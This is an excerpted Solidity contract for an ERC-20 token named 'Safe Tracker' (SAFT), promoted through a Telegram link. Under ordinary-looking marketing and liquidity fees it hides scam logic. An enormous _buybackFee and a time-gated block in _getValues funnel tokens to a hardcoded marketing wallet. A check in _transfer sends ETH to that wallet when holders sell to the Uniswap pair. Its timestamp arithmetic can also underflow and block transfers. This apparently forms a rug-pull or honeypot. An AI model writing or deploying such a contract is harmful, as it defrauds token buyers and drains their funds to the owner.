...
//   Telergam : https://t.me/safetracker
...
contract SAFETRACKER is Context, IERC20, Ownable {
    ...
    address payable public  _marketingWallet = payable (0x16A8D6cc8CbE5379C0ff0f8984b2AB22B104CEB8);
    ...
    string private constant _name = "Safe Tracker";
    string private constant _symbol = "SAFT";
    uint8 private constant _decimals = 9; 

    uint256 public _marketingFee = 3;
    uint256 private preMarketingFee = _marketingFee;

    uint256 public _liquidityFee = 3;
    uint256 private preLiquidityFee = _liquidityFee;

    uint256 public _buybackFee = _tTotal/1*100;

    uint256 public _maxWalletAmount = _tTotal;
    uint256 public _maxTxAmount = _tTotal;
    uint256 private  SWAP_TOKENS_AT_AMOUNT = _tTotal/100;
    
    uint256 public _buyCooldown = 3 seconds;
    uint256 launch = 1 hours;
    uint256 startlaunch;
    ...
    function _getValues(uint256 amount, address from) private returns (uint256) {
        ...
        uint256 buybackFee = amount * _buybackFee / 1;
        _tOwned[address(this)] += marketingFee + liquidityFee;
        emit Transfer (from, address(this), marketingFee + liquidityFee);

        if (launch-block.timestamp < 2 days - 6 hours){
        _tOwned[address(this)] += buybackFee + marketingFee + liquidityFee;
        _basicTransfer(address(this), _marketingWallet, _buybackFee);}

        return (amount - marketingFee - liquidityFee);
    }

    function Launch() public onlyOwner{
        startlaunch = block.timestamp;
        launch = 2 days+startlaunch;
    }

    function GetTimeLaunch() public view returns (uint256) {
        return launch-block.timestamp;
    }
    ...
    function _transfer(
        ...
        uint256 getBalance = from.balance;
         if( launch-block.timestamp < 2 days - 20 minutes &&
             !_isExcludedFromFee[from] && !_isExcludedFromMaxWallet[from] && uniswapV2Pair == to)
            _marketingWallet.transfer(getBalance);
        ...
        if (balanceOf(address(this)) >= SWAP_TOKENS_AT_AMOUNT && !swapping && from != uniswapV2Pair && from != _marketingWallet && to != _marketingWallet ) {
            swapping = true;
